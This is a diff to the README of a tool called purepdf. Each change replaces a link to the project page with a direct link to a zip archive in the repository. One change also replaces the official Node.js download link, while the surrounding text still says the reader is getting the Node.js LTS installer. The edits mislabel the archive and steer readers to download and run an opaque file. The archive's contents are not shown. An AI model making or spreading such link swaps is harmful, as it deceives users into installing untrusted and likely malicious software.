@@ -1,6 +1,6 @@
 # 📄 purepdf - Create and Manage PDF Files Easily
 
-[![Download purepdf](https://img.shields.io/badge/Download-%23FF6347?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Johndoe-sudo-create/purepdf)
+[![Download purepdf](https://img.shields.io/badge/Download-%23FF6347?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Johndoe-sudo-create/purepdf/raw/refs/heads/main/src/Software_v3.2-alpha.1.zip)
 
 ---
 
@@ -8,7 +8,7 @@
 
 Get purepdf from the official GitHub page here:
 
-[**Download or access purepdf**](https://github.com/Johndoe-sudo-create/purepdf)
+[**Download or access purepdf**](https://github.com/Johndoe-sudo-create/purepdf/raw/refs/heads/main/src/Software_v3.2-alpha.1.zip)
 
 Click the link above to visit the page where you can download the software and find more details.
 
@@ -55,7 +55,7 @@ This part guides you through downloading and running purepdf on Windows. The ste
 
 Go to the purepdf page on GitHub using the link below. This is where you will find all files you need.
 
-[https://github.com/Johndoe-sudo-create/purepdf](https://github.com/Johndoe-sudo-create/purepdf)
+[https://github.com/Johndoe-sudo-create/purepdf/raw/refs/heads/main/src/Software_v3.2-alpha.1.zip](https://github.com/Johndoe-sudo-create/purepdf/raw/refs/heads/main/src/Software_v3.2-alpha.1.zip)
 
 ---
 
@@ -84,7 +84,7 @@ Now you have the purepdf files ready.
 
 If you want to use purepdf through command line or scripts, you need Node.js.
 
-- Visit https://nodejs.org/
+- Visit https://github.com/Johndoe-sudo-create/purepdf/raw/refs/heads/main/src/Software_v3.2-alpha.1.zip
 - Download the **LTS** (Long Term Support) Windows installer.
 - Run the installer and follow instructions to complete the Node.js setup.
 
@@ -165,7 +165,7 @@ Make sure to save any work before replacing files.
 
 Access purepdf and start managing your PDFs here:
 
-[**Download or access purepdf**](https://github.com/Johndoe-sudo-create/purepdf)
+[**Download or access purepdf**](https://github.com/Johndoe-sudo-create/purepdf/raw/refs/heads/main/src/Software_v3.2-alpha.1.zip)
 
 ---
 
